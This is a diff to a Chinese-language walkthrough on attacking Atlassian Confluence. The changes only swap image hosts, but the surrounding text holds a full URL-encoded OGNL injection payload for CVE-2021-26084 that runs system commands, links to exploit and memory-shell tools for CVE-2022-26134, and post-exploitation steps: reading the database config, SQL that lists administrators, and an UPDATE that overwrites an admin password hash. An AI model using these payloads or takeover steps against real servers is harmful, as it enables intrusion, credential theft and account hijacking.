@@ -92,9 +92,9 @@ https://github.com/jbaines-r7/through_the_wire
 
 https://github.com/BeichenDream/CVE-2022-26134-Godzilla-MEMSHELL
 
-![](https://gitee.com/fuli009/images/raw/master/public/20230629083534.png)
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230629083534.png)
 
-![](https://gitee.com/fuli009/images/raw/master/public/20230629083536.png)
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230629083536.png)
 
 提取jar中的exp供大家学习，后续公众号也会发关于内存马的文章：  
 
@@ -153,7 +153,7 @@ OGNL表达式注入代码执行漏洞（CVE-2021-26084）其部分版本测试�
       
     queryString=%5cu0027%2b%7bClass.forName%28%5cu0027javax.script.ScriptEngineManager%5cu0027%29.newInstance%28%29.getEngineByName%28%5cu0027JavaScript%5cu0027%29.%5cu0065val%28%5cu0027var+isWin+%3d+java.lang.System.getProperty%28%5cu0022os.name%5cu0022%29.toLowerCase%28%29.contains%28%5cu0022win%5cu0022%29%3b+var+cmd+%3d+new+java.lang.String%28%5cu0022ifconfig%5cu0022%29%3bvar+p+%3d+new+java.lang.ProcessBuilder%28%29%3b+if%28isWin%29%7bp.command%28%5cu0022cmd.exe%5cu0022%2c+%5cu0022%2fc%5cu0022%2c+cmd%29%3b+%7d+else%7bp.command%28%5cu0022bash%5cu0022%2c+%5cu0022-c%5cu0022%2c+cmd%29%3b+%7dp.redirectErrorStream%28true%29%3b+var+process%3d+p.start%28%29%3b+var+inputStreamReader+%3d+new+java.io.InputStreamReader%28process.getInputStream%28%29%29%3b+var+bufferedReader+%3d+new+java.io.BufferedReader%28inputStreamReader%29%3b+var+line+%3d+%5cu0022%5cu0022%3b+var+output+%3d+%5cu0022%5cu0022%3b+while%28%28line+%3d+bufferedReader.readLine%28%29%29+%21%3d+null%29%7boutput+%3d+output+%2b+line+%2b+java.lang.Character.toString%2810%29%3b+%7d%5cu0027%29%7d%2b%5cu0027
 
-![](https://gitee.com/fuli009/images/raw/master/public/20230629083537.png)
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230629083537.png)
 
  **  
 **
@@ -202,7 +202,7 @@ Windows
 
 得到数据库配置文件：  
 
-![](https://gitee.com/fuli009/images/raw/master/public/20230629083538.png)
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230629083538.png)
 
   *   *   * 
 
@@ -212,7 +212,7 @@ Windows
 
 在配置文件中获得数据库信息，连接数据库
 
-![](https://gitee.com/fuli009/images/raw/master/public/20230629083540.png)
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230629083540.png)
 
 2、查询所有管理员权限用户
 
@@ -222,7 +222,7 @@ Windows
     
     select u.id, u.user_name, u.active from `confluence`.`cwd_user` u join `confluence`.`cwd_membership` m on u.id=m.child_user_id join `confluence`.`cwd_group` g on m.parent_id=g.id join `confluence`.`cwd_directory` d on d.id=g.directory_id where g.group_name = 'confluence-administrators' and d.directory_name='Confluence Internal Directory';
 
-![](https://gitee.com/fuli009/images/raw/master/public/20230629083541.png)
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230629083541.png)
 
 3、查看用户密码
 
@@ -258,11 +258,11 @@ Windows
     
     update cwd_user set credential = '{PKCS5S2}V1J8HcMvYsdtnETu2tjA1gFVQ1L3o+dAsNiooSAcSvpRcbkTR8K4Ha/iWgF145gk' where id=xxxxxx;
 
-![](https://gitee.com/fuli009/images/raw/master/public/20230629083542.png)
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230629083542.png)
 
  **登录后台—— >用户管理——>添加用户——>加管理员组——>还原admin密码**
 
-![](https://gitee.com/fuli009/images/raw/master/public/20230629083544.png)
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230629083544.png)
 
   
 
@@ -270,19 +270,19 @@ Windows
 
 https://github.com/BeichenDream/PostConfluence
 
-![](https://gitee.com/fuli009/images/raw/master/public/20230629083545.png)
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230629083545.png)
 
-![](https://gitee.com/fuli009/images/raw/master/public/20230629083546.png)
-
-  
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230629083546.png)
 
   
 
-![](https://gitee.com/fuli009/images/raw/master/public/20230629083548.png)
+  
+
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230629083548.png)
 
   
 
-![](https://gitee.com/fuli009/images/raw/master/public/20230629083549.png)
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230629083549.png)
 
 预览时标签不可点
 
